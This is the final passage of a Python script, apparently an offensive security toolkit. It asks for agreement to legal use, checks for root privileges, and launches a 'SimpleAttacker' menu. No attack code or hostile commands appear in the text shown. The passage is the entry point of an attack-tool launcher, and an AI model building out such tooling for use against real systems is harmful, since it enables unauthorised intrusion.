    agree = input("\nDo you agree to use this only legally? (yes/NO): ").strip().lower()
    if agree != "yes":
        print("❌ Exiting. Only use for authorized testing.")
        return
    
    if os.geteuid() != 0:
        print("⚠️ Note: Many tools need sudo (some will auto-request)")
    
    attacker = SimpleAttacker()
    attacker.main_menu()

if __name__ == "__main__":
    main()
